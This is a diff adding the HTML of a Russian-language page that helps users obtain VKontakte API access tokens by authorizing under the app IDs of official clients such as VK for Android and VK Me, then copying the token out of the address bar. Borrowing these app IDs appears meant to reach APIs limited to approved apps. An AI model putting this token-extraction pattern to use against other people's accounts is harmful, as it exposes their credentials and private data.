+      <img class="p_icon" src="https://pp.userapi.com/c412825/v412825174/6522/nEKTkD_Uqcg.jpg">
+       <div class="desc">
+        <p>
+         ВКонтакте для Android
+        </p>
+        <p>
+         ID приложения: 2685278
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(4083558)">
+      VFeed
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c613529/v613529371/16761/Mjwh_-ADFK8.jpg">
+       <div class="desc">
+        <p>
+         VFeed для iphone
+        </p>
+        <p>
+         ID приложения: 4083558
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(6146827)">
+      VK Me
+     </button>
+     <span>
+      <img class="p_icon" src="https://vk.com/images/dquestion_a.png">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 6146827
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(3116505)">
+      VK API
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c840138/v840138345/787f9/ZTLHQaj4S7U.jpg">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 3116505
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" id="settings">
+      Настройки
+     </button>
+     <span>
+      <div class="desc">
+       Настройка прав, указание ID приложения, а также получение токена для группы
+      </div>
+     </span>
+    </div>
+   </div>
+  </section>
+  <section class="main-content">
+   <h3>
+    Инструкция
+   </h3>
+   <ol>
+    <li>
+     Выберите приложение
+     <li>
+      Нажмите на него
+      <li>
+       Затем нажмите "разрешить"
+       <li>
+        Скопируйте часть адресной строки от
+        <span>
+         access_token=
+        </span>
+        до
+        <span>
+         &amp;expires;_in
+        </span>
+       </li>
+      </li>
+     </li>
+    </li>
+   </ol>
+  </section>
+  <div class="modal" id="myModal">
+   <div class="modal-content">
+    <div class="modal-header">
+     <span id="close_button">
+      ×
+     </span>
+     <h3>
+      Настройки
+     </h3>
+    </div>
+    <div class="modal-body">
+     <p>
+      Тип токена
+     </p>
+     <input checked="" class="pcheck" id="token_type_user" name="type" type="radio">
+      <label class="btn" for="token_type_user">
+       Пользователь
+      </label>
+      <input class="pcheck" id="token_type_group" name="type" type="radio">
+       <label class="btn" for="token_type_group">
+        Сообщество
+       </label>
+       <p>
+        ID приложения
+       </p>
+       <input class="btn" id="app_id" placeholder="6121396" type="number" value="6121396">
+        <div id="group_block" style="display:none">
+         <p>
+          ID сообщества (через запятую, если их несколько)
+         </p>
+         <input class="btn" id="group_id" placeholder="123,456">
+         </input>
+        </div>
+        <p>
+         Права [
+         <span id="uncheck">
+          снять все
+         </span>
+         ]
+        </p>
+        <div class="pblock" id="permissions">
+        </div>
+        <div class="pblock" id="gpermissions" style="display:none">
+        </div>
+        <p id="offline_warning">
+         Не убирайте право "Доступ в любое время", если планируете использовать токен с другого IP адреса, например на хостинге
+         <br>
+          <br>
+           Также обратите внимание, что методы для работы с аудиозаписями и сообщениями работают только с одобренными приложениями. Подробнее:
+           <a href="https://vk.com/dev/audio_api" target="_blank">
+            Отключение публичного API для аудио
+           </a>
+           ,
+           <a href="https://vk.com/dev/messages_api" target="_blank">
+            Ограничение Messages API
+           </a>
+          </br>
+         </br>
+        </p>
+        <span class="modal_bottom_text">
+         Актуальный список прав доступа здесь:
+         <a href="https://vk.com/dev/permissions" target="_blank">
+          Права доступа приложения
+         </a>
+        </span>
+       </input>
+      </input>
+     </input>
+    </div>
+    <div class="modal-footer">
+     <div id="err_msg" style="display: none;">
+      Ошибка: заполните все поля
+     </div>
+     <div align="right">
+      <button class="btn" id="submit">
+       Получить
+      </button>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
